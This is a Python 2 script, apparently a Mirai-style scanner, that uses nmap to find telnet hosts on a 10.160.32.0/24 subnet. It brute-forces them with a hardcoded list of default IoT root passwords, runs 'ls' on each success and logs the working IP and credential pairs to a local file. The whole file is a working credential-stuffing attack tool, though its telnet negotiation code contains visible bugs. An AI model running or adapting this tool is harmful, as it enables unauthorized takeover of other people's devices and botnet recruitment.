#!/usr/bin/python
# -*- coding: UTF-8 -*-
import socket,time,random,re,nmap
import threading
wpt = {'1':['root','xc3511'],'2':['root','vizxv'],'3':['root','klv1234'],
		'4':['root','dreambox'],'5':['root','zlxx'],'6':['root','default'],
		'7':['root','juantech'],'8':['root','realtek'],'9':['root','54321'],
		'10':['root','7ujMko0vizxv'],'11':['admin','hi3518'],'12':['root','anko'],
		'13':['root','7ujMko0vizxv'],'14':['root','pass'],'15':['root','1111'],
		'16':['root','666666'],'17':['admin','default'],'18':['root','1234'],
		'19':['root','klv123'],'20':['root','admin'],'21':['root','888888'],
		'22':['root','password'],'23':['root','jvbzd'],'24':['root','root'],
		'25':['root','Zte521'],'26':['root',''],'27':['root','12345'],
		'28':['root','system'],'29':['root','ikwb'],'30':['admin','admin'],
		'31':['root','user'],'32':['root','123456'],'33':['root','00000000'],
}
def telnet_login(sock,un,pw):
	#consumed = 0 #当前字符在字符串中的位置
	conn_state = 'SC_HANDLE_IACS'
	conn_num = 1
	while True:
		buf_recv = sock.recv(1024)
		rdbuf_pos = len(buf_recv) #接收字符串的长度
		while True:
			if conn_state == 'SC_HANDLE_IACS':
				if consume_iacs(sock,buf_recv) > 0:
					conn_state = 'SC_WAITING_USERNAME'
					continue
				break
			elif conn_state == 'SC_WAITING_USERNAME':
				if consume_user_prompt(sock,buf_recv,'ogin:',un):
					conn_state = 'SC_WAITING_PASSWORD'
				break
			elif conn_state == 'SC_WAITING_PASSWORD':
				if buf_recv.find('ogin:') != -1:
					conn_state = 'SC_CLOSED'
					continue
				if consume_pass_prompt(sock,buf_recv,'assword:',pw):
					conn_state = 'SC_WAITING_PASSWD_RESP'
				break
			elif conn_state == 'SC_WAITING_PASSWD_RESP':
				if consume_any_prompt(sock,buf_recv):
					print 'Finish!'
					return True
				elif buf_recv.find('ogin:') != -1:
					if buf_recv.find('Last login:') != -1:
						break
					else:
						conn_num += 1
						conn_state =  'SC_WAITING_USERNAME'
					continue
				elif conn_num >2:
					print conn_num
					conn_state = 'SC_CLOSED'
					continue
				else:
					#conn_state = 'SC_CLOSED'
					break
			elif conn_state == 'SC_CLOSED':
				#sock.close()
				print 'socket closed'
				return False
			else :
				print 'OCCUR ERROR'
				return False

def consume_iacs(sock,buf_recv):
	'''建立telnet连接'''
	consumed = 0
	rdbuf_pos = len(buf_recv)
	while consumed < rdbuf_pos:
		if hex(ord(buf_recv[0:1])) != '0xff':
			break
		elif hex(ord(buf_recv[0:1])) == '0xff':
			if hex(ord(buf_recv[1:2])) == '0xff':
				buf_recv = buf_recv[2:]
				consumed +=2
				continue
			elif buf_recv[1:2] == '0xfd':
				tmp1 = [255,251,31]
				tmp2 = [255,250,31,0,80,0,24,255,240]
				if buf_recv[2:3] != 31:
					for i in range(0,3):
						if buf_recv[i:i+1] == '0xfd':
							buf_recv[i:i+1] = '0xfc'
						elif buf_recv[i:i+1] == '0xfb':
							buf_recv[i:i+1] = '0xfd'
					sock.send(buf_recv)
					buf_recv = buf_recv[3:]
					consumed += 3
				else :
					buf_recv = buf_recv[3:]
					consumed += 3
					send(tmp1)
					send(tmp2)

			else:
				for i in range(0,3):
					if buf_recv[i:i+1] == '0xfd':
						buf_recv[i:i+1] = '0xfc'
					elif buf_recv[i:i+1] == '0xfb':
						buf_recv[i:i+1] = '0xfd'
				sock.send(buf_recv)
				buf_recv = buf_recv[3:]
				consumed +=3

	return rdbuf_pos -consumed

def consume_user_prompt(sock,buf_recv,prompt,msg):
	if buf_recv.find(prompt) != -1:
		sock.send(msg.decode('utf-8')) #telnet采用ascii编码格式
		sock.send('\r\n')#必须发送，表示回车，否则出错
		return True
	return False

def consume_pass_prompt(sock,buf_recv,prompt,msg):
	if buf_recv.find(prompt) != -1:
		sock.send(msg.decode('utf-8')) #telnet采用ascii编码格式
		sock.send('\r\n')#必须发送，表示回车，否则出错
		return True
	return False

def consume_any_prompt(sock,buf_recv):
	#p = r":['/','~']['$','#','%','>']"
	p = r"['$','#','%','>']"
	rule = re.compile(p)
	if rule.findall(buf_recv):
		#print '登录成功'
		sock.send('ls') #测试执行系统命令
		sock.send('\r\n')
		while True:
			buf_recv = sock.recv(1024) #telnet每发送一个字符，发送端都将接收到该字符
			print buf_recv #最后才接收到执行系统命令的结果
			if rule.findall(buf_recv):
				sock.send('exit') #退出telnet连接
				sock.send('\r\n')
				#sock.close()
				return True

	return False

def setup_connection(ip):
	try:
		sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		sock.connect((ip,23))
		sock.settimeout(20)
		return sock
	except Exception as e:
		print "Connection timeout!"
		return

def findtgets(subnet):
	nm = nmap.PortScanner()
	nm.scan(subnet, '23')
	tgthosts = []
	for host in nm.all_hosts():
		if nm[host].has_tcp(23):
			state = nm[host]['tcp'][23]['state']
			if state == 'open':
				print host + ' : opend 23'
				tgthosts.append(host)
	return tgthosts

def scan(ip,count):
	try:
		while True:
			for v in wpt.values():
				sock = setup_connection(ip)
				if not sock:
					break
				print "[scanner] FD%d connected. Trying %s:%s"%(count,v[0],v[1])
				if telnet_login(sock,v[0],v[1]):
					sock.close()
					f = open('/home/bot/Desktop/xhp-1.txt','a+')
					str_print = ' '.join((ip,v[0],v[1]))
					f.write(str_print+'\n')
					f.close()
					ip_scanable.append(ip)
					break
				print "sock.close()"
				sock.close()
				#sock = setup_connection(ip)
			break
	except:
		print "Login() ERROR"

if __name__ == '__main__':
	ip_scanable = findtgets('10.160.32.0/24')
	print ip_scanable
	start= time.time()
	end = start
	count = 0
	threads = []
	try:
		for i in range(0,len(ip_scanable)):
			count += 1
			ip = ip_scanable[i]
			t = threading.Thread(target=scan,args=(ip,count))
			f = open('/home/bot/Desktop/ip_tables-1.txt','a+')
			f.write(ip+'\n')
			f.close()
			threads.append(t)
		for t in threads:
			t.start()
		for t in threads:
			t.join()
	except :
		print 'Ip does not exist'
	end = time.time()
	print end - start
	print 'END'

